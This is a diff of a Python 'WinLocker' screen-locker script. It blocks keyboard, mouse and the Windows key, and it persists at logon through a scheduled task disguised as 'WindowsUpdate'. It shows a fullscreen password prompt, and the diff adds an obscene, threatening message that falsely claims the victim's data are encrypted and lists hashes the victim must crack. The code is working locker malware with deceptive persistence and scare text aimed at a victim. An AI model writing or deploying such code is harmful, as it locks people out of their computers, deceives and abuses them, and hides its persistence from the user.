@@ -1,9 +1,8 @@
-import ctypes, os, sys, time, threading, random, math, webbrowser, tkinter as tk
+import ctypes, os, sys, time, threading, random, math, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-VIDEO_URL = "https://vk.com/video-30602036_456293338"
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -31,13 +30,6 @@ def add_to_startup():
     command = f'python "{script_path}"'
     subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)
 
-# === ОТКРЫВАЕМ ВИДЕО ВК В БРАУЗЕРЕ ===
-def play_video():
-    try:
-        webbrowser.open(VIDEO_URL)
-    except:
-        pass
-
 # === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
 class WinLocker:
     def __init__(self):
@@ -58,6 +50,24 @@ class WinLocker:
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
         self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         
+        # Дополнительный страшный текст
+        scary_text = (
+            "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
+            "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
+            "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n"
+            "СОСИ ХУЙ\n\n"
+            "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n"
+            "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n"
+            "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n"
+            "МУЧАЙСЯ ПИДОР\n\n"
+            "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n"
+            "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n"
+            "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n"
+            "4. Base64\nNDM1NjM0MjM0\n"
+            "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
+        )
+        self.canvas.create_text(400, 450, text=scary_text, fill='white', font=('Courier', 14))
+        
         # Поле ввода
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
         self.canvas.create_window(400, 360, window=self.entry)
@@ -65,7 +75,7 @@ class WinLocker:
         
         # Данные для летающих объектов
         self.skulls = []
-        for _ in range(6):  # 6 черепов
+        for _ in range(6):
             self.skulls.append({
                 'x': random.randint(100, 700),
                 'y': random.randint(200, 500),
@@ -74,7 +84,7 @@ class WinLocker:
             })
         
         self.fucks = []
-        for _ in range(8):  # 8 "факов"
+        for _ in range(8):
             self.fucks.append({
                 'x': random.randint(100, 700),
                 'y': random.randint(100, 500),
@@ -153,6 +163,5 @@ if __name__ == "__main__":
     time.sleep(TIMER_SECONDS)
     block_input(True)
     threading.Thread(target=block_win_key, daemon=True).start()
-    threading.Thread(target=play_video, daemon=True).start()
     app = WinLocker()
     app.root.mainloop()
